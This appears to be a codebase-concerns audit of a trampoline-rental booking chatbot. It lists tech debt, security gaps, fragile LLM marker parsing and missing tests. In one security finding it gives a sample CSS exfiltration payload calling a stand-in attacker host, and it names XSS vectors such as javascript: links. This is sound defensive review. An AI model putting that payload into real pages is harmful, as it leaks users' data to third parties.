# Codebase Concerns

**Analysis Date:** 2026-03-05

## Tech Debt

**Trampoline catalog data duplicated across four files:**
- Issue: The full `TRAMPOLINES` array is copy-pasted into four separate files with divergent values. `max` capacities differ — for example Dziumandzi parkas is max=200 in Chatwoot enricher vs max=40 in widget enricher; Giga ruozas is max=1000 vs max=100; Mega ruozas is max=600 vs max=100. Schema also differs — widget enricher uses `price` and `detail` fields, Chatwoot enricher uses `shortDesc`.
- Files: `chatwoot/enrich-chatwoot.js` (lines 72-102), `n8n-workflows/enrich-response-code.js` (lines 14-44), `chatwoot/enrich-chatwoot-test.js` (lines 14-36), `n8n-workflows/enrich-response-code-test.js` (lines 7-37)
- Impact: Any product update (new trampoline, capacity change, image URL change) must be applied in four places. Divergent `max` values mean the two channels show different recommended equipment for the same guest count, leading to inconsistent UX.
- Fix approach: Extract catalog into a single shared JSON file (e.g. `data/trampolines.json`) and import or require it in all enrichers.

**Two parallel enrichment pipelines with duplicated logic:**
- Issue: The n8n widget flow uses `n8n-workflows/enrich-response-code.js` (HTML output, `{{HTML}}` prefix, progress bar). The Chatwoot flow uses `chatwoot/enrich-chatwoot.js` (Chatwoot message objects). Both files implement the same marker set, same builder functions, same contextual quick-reply logic — independently. Any new marker requires changes in both.
- Files: `n8n-workflows/enrich-response-code.js`, `chatwoot/enrich-chatwoot.js`
- Impact: High maintenance cost. Features added to one enricher are routinely forgotten in the other — for example `GUEST_COUNT_PUBLIC` marker is handled in Chatwoot enricher but is absent from the widget enricher's marker table (lines 326-334 of `enrich-response-code.js`).
- Fix approach: Extract shared marker-parsing logic into a platform-agnostic module and pass a renderer strategy (HTML vs Chatwoot objects).

**`buildLocationOptions` is dead code in widget enricher:**
- Issue: `buildLocationOptions()` is defined at line 217 of `n8n-workflows/enrich-response-code.js` but the corresponding `[LOCATION_OPTIONS]` marker was removed from prompts. A comment at line 325 documents this: "LOCATION_OPTIONS marker removed — no longer present in prompts." The function is never called.
- Files: `n8n-workflows/enrich-response-code.js` (lines 217-229)
- Impact: Dead code confuses future maintainers.
- Fix approach: Remove the `buildLocationOptions` function.

**Progress bar step numbering skips step 2:**
- Issue: `buildProgressBar(1)` is called for `[DATE_PICKER]`, `buildProgressBar(3)` for `[GUEST_COUNT]`, and `buildProgressBar(4,4)` for equipment groups. Step 2 (location) never gets a progress bar call, so the bar jumps from step 1 to step 3 visually.
- Files: `n8n-workflows/enrich-response-code.js` (lines 327-328)
- Impact: Misleading progress indicator to users mid-booking flow.
- Fix approach: Either add `buildProgressBar(2)` to the location text response, or renumber to a 3-step progress (date, guests, equipment).

**Test wrappers are manual syncs, not imports:**
- Issue: `chatwoot/enrich-chatwoot-test.js` and `n8n-workflows/enrich-response-code-test.js` are browser-runnable wrappers that manually re-inline the production code inside a function. The header in `enrich-chatwoot-test.js` reads "Synced with production on 2026-03-04", indicating manual sync.
- Files: `chatwoot/enrich-chatwoot-test.js`, `n8n-workflows/enrich-response-code-test.js`
- Impact: Test wrappers can go stale without notice. No automated check that test code matches production code.
- Fix approach: Use a build script to auto-generate the test wrappers from production files, or restructure production code as importable modules.

**`chat-main.json` kept as dead reference workflow:**
- Issue: `n8n-workflows/chat-main.json` is the old Claude-based workflow. `docs/SETUP.md` documents it as deprecated but tells users to keep it "for reference." `README.md` still lists it without any deprecation note.
- Files: `n8n-workflows/chat-main.json`, `README.md`
- Impact: Outdated workflow gets imported by mistake; README misleads new contributors.
- Fix approach: Mark `chat-main.json` as deprecated in README or delete it.

## Security Considerations

**Chatwoot base URL and account ID hardcoded in committed code:**
- Risk: The Chatwoot API endpoint `https://batutynas-chatwoot-chatwoot.0uvai5.easypanel.host/api/v1/accounts/1` is hardcoded at line 15 of `chatwoot/enrich-chatwoot.js`. This exposes the internal service hostname and account ID in the repository.
- Files: `chatwoot/enrich-chatwoot.js` (line 15)
- Current mitigation: The file is an n8n code node that only runs server-side. The URL is not a bearer credential.
- Recommendations: Move to an n8n workflow variable (`CHATWOOT_BASE_URL`) to allow environment-specific deployment without code changes.

**Facebook Messenger HMAC signature verification is disabled:**
- Risk: The `fb-messenger-main.json` workflow comments explain that signature verification was disabled because n8n does not expose the raw request body. Any HTTP POST to the Messenger webhook URL will be processed as a legitimate Facebook event.
- Files: `n8n-workflows/fb-messenger-main.json` (Extract and Route code node, line 25 area)
- Current mitigation: `FB_VERIFY_TOKEN` is checked on GET (subscription verification only). POST requests are not verified by HMAC.
- Recommendations: Implement a reverse-proxy workaround to forward the raw body for HMAC validation, or document the risk and accept it explicitly.

**`style` attribute is in the chat widget HTML sanitizer allowlist:**
- Risk: `sanitizeHtml()` in `chat-widget.js` includes `style` in `ALLOWED_ATTRS` (line 312). Allowing inline style can enable CSS-based data exfiltration attacks (e.g. `background: url(http://attacker.com/...)`).
- Files: `chat-widget/chat-widget.js` (line 312)
- Current mitigation: The tag and attribute allowlist is otherwise tight. The `sanitizeHtml` function strips disallowed elements and validates href/src protocols.
- Recommendations: Remove `style` from `ALLOWED_ATTRS` or add a CSS property allowlist. Use CSS classes for interactive component styling instead.

**Interactive HTML persisted to localStorage as raw markup:**
- Risk: The widget persists interactive HTML (prefixed `{{HTML}}`) directly to `localStorage` via `persistInteractionState()` (line 552) and restores it by setting it via the sanitize function on load. If a sanitization gap exists, persisted HTML could enable stored XSS on page reload.
- Files: `chat-widget/chat-widget.js` (lines 544-555, 295-296)
- Current mitigation: Content is passed through `sanitizeHtml()` on both write and read paths.
- Recommendations: Store structured data (JSON of selected options) in localStorage rather than raw HTML markup. Re-render cards client-side on load to eliminate the sanitizer dependency on persistence.

**FB Page Access Token stored inside n8n workflow JSON:**
- Risk: When configured, the FB Page Access Token replaces `PASTE_YOUR_FB_PAGE_ACCESS_TOKEN_HERE` inside `fb-messenger-main.json`. If the configured workflow is exported and committed, the token is in git history.
- Files: `n8n-workflows/fb-messenger-main.json`
- Current mitigation: The placeholder value is committed, not the real token.
- Recommendations: Use n8n's built-in credential store for the access token instead of hardcoding it in the code node.

## Performance Bottlenecks

**Full widget DOM re-render on every state change:**
- Problem: `render()` in `chat-widget.js` removes the entire widget DOM node and recreates it from scratch on every message addition, language change, and toggle. This includes all message bubbles, buttons, SVG icons, and event re-binding.
- Files: `chat-widget/chat-widget.js` (lines 130-291, `addMessage` at line 461, `toggleChat` at line 418)
- Cause: No virtual DOM or incremental DOM patching. Every state mutation triggers full rebuild.
- Improvement path: Add incremental message appending — only append new message bubbles to the messages container instead of full re-render. Reserve full re-render for language switches.

**Date picker uses `toISOString()` (UTC) in server-side n8n widget enricher:**
- Problem: `buildDatePicker()` in `n8n-workflows/enrich-response-code.js` (line 205) uses `d.toISOString().split('T')[0]` for ISO date strings. `toISOString()` returns UTC time. Lithuania is UTC+2/+3, so dates generated late evening on an n8n server can show the wrong day for Lithuanian users.
- Files: `n8n-workflows/enrich-response-code.js` (lines 199-215)
- Cause: The Chatwoot enricher (`chatwoot/enrich-chatwoot.js` lines 376-382) correctly uses local date parts. The fix was applied to one enricher but not the other.
- Improvement path: Replace `d.toISOString().split('T')[0]` with `d.getFullYear() + '-' + pad2(d.getMonth()+1) + '-' + pad2(d.getDate())` to match the fix already in `enrich-chatwoot.js`.

## Fragile Areas

**BOOKING_CONFIRM regex fails on doubly-nested JSON:**
- Files: `chatwoot/enrich-chatwoot.js` (line 632), `n8n-workflows/enrich-response-code.js` (line 371)
- Why fragile: The regex `\[BOOKING_CONFIRM:(\{[^}]*(?:\{[^}]*\}[^}]*)*\})\]` handles one level of nested braces. If the AI generates a field value containing two or more levels of nesting, the regex silently fails to match and the booking confirmation is dropped with no error. The system prompt does not formally constrain AI output to flat JSON.
- Safe modification: Always test after changes to the system prompt booking format. Consider switching to a sentinel delimiter (e.g. unique start/end tokens) rather than regex-parsing JSON embedded in bracket markers.
- Test coverage: Manual only (browser test wrappers).

**Entire interactive UI depends on LLM producing exact marker strings:**
- Files: `prompts/chat-system-prompt.md`, `chatwoot/enrich-chatwoot.js`, `n8n-workflows/enrich-response-code.js`
- Why fragile: All interactive components (cards, date pickers, booking confirmation) depend on the LLM producing exact strings like `[DATE_PICKER]` and `[BOOKING_CONFIRM:{...}]` in the correct format. If the model wraps the marker in backticks, quotes, or places it inline, the enricher produces no interactive element and silently outputs plain text. No fallback detection exists for malformed markers.
- Safe modification: Add a post-processing step that detects likely-malformed markers (e.g. markdown code fenced markers) and strips the surrounding syntax before enrichment.
- Test coverage: No automated regression tests for marker edge cases.

**Session state can grow large with HTML message payloads:**
- Files: `chat-widget/chat-widget.js` (lines 69-80, 544-555)
- Why fragile: `saveSession()` slices up to 50 messages. Messages containing the `{{HTML}}` prefix with large card HTML can each be several kilobytes. With 50 messages, the session can exceed typical 5 MB localStorage quota. The catch block in `saveSession()` silently swallows the quota error with no user notification.
- Safe modification: Limit stored message payload size. Strip or compress HTML content before persisting; store only user-visible text and re-render cards on load.
- Test coverage: No tests for localStorage quota edge cases.

## Scaling Limits

**n8n in-process session memory does not survive restarts:**
- Current capacity: Conversation history is stored in n8n's built-in memory buffer per session ID.
- Limit: n8n memory nodes are in-process and do not persist across n8n restarts. A server restart loses all active conversation contexts.
- Scaling path: Use an external session store (Redis or Postgres) via n8n's database memory node or a custom HTTP state service.

**Single Chatwoot account ID hardcoded:**
- Current capacity: All Chatwoot API calls target account ID `1` at a single hardcoded instance URL.
- Limit: Cannot support staging vs production separation or multi-tenant use without code edits.
- Scaling path: Parameterize `chatwootBase` and account ID as n8n workflow variables.

## Dependencies at Risk

**Pinecone RAG index has no health check:**
- Risk: `chat-main-v2.json` uses a Pinecone index for product knowledge. If the index is accidentally cleared or the namespace changes, the chatbot silently falls back to static system prompt content with no observable error to the operator.
- Impact: Users receive degraded, potentially outdated responses with no indication of the failure.
- Migration plan: Add a health-check node in the n8n workflow that verifies the Pinecone index has a minimum vector count before processing requests.

**All product images served from zyrosite.com CDN:**
- Risk: All trampoline product images are served from `assets.zyrosite.com` CDN URLs hardcoded in the `TRAMPOLINES` array across all four enricher copies. If zyrosite.com changes URL structure or the CDN goes offline, all product card images break.
- Impact: Cards render with broken image placeholders. The no-image fallback (emoji icons, text dropdown) works but loses the visual catalog experience.
- Migration plan: Host images on a controlled CDN and update image URLs in the shared catalog data.

## Missing Critical Features

**No webhook authentication on n8n chat webhook:**
- Problem: The n8n chat webhook accepts POST requests with no bearer token or HMAC signature. Any client that knows the webhook URL can submit arbitrary messages and trigger AI completions and booking notifications.
- Blocks: Abuse prevention, rate limiting, spam protection, AI cost control.

**No rate limiting in the chat widget:**
- Problem: The widget disables the send button while `state.sending` is true, but this is a UI-only guard. A user can call `BatutynasChat` public API methods directly from the browser console to flood the webhook endpoint.
- Blocks: Protection against accidental or malicious flooding of n8n and upstream AI API cost accumulation.

## Test Coverage Gaps

**No automated tests for enricher marker handling:**
- What's not tested: The marker-to-component rendering pipeline in both `enrich-response-code.js` and `enrich-chatwoot.js` has no automated test runner. The test wrappers are browser-manual files intended to be opened and visually inspected.
- Files: `n8n-workflows/enrich-response-code-test.js`, `chatwoot/enrich-chatwoot-test.js`
- Risk: Regressions in marker parsing or output generation go undetected until manual QA.
- Priority: High — enricher logic is the core of the interactive chat UX.

**No end-to-end tests for the booking flow:**
- What's not tested: The full 6-step booking flow (date, location, guests, equipment, addons, contacts, BOOKING_CONFIRM) is not covered by any automated test. The BOOKING_CONFIRM JSON parsing, booking_notify tool invocation, and email notification are all untested automatically.
- Files: `n8n-workflows/tool-booking-notify.json`, `n8n-workflows/chat-main-v2.json`
- Risk: A regression in booking confirmation silently fails to notify the business of new orders.
- Priority: High — booking confirmation is the primary business-critical outcome.

**No automated tests for `sanitizeHtml` edge cases:**
- What's not tested: The `sanitizeHtml()` function in `chat-widget.js` is the primary XSS guard for AI-generated content injected via the `{{HTML}}` prefix. Edge cases such as `javascript:` in href, `data:` URLs, and CSS expression values in the `style` attribute are not covered by automated tests.
- Files: `chat-widget/chat-widget.js` (lines 304-352)
- Risk: A gap in sanitization could allow stored XSS via malicious AI output or a compromised webhook response.
- Priority: High.

---

*Concerns audit: 2026-03-05*
